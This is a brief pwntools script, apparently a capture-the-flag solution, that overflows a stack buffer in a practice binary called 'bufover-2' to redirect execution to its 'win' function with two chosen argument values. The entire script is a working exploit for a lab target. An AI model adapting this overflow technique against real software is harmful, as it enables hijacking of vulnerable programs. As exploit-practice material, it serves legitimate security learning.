from pwn import *

e = ELF('./bufover-2')
p = process('./bufover-2')

win_addr = e.symbols['win']
arg1_addr = 0x14B4DA55
arg2_addr = 0xF00DB4BE


payload = 'A'*28
payload += p32(win_addr)
payload += 'AAAA'
payload += p64(arg1_addr)
payload += p32(arg2_addr)

print p.recvuntil('>')
p.sendline(payload)
p.interactive()
print p.recv()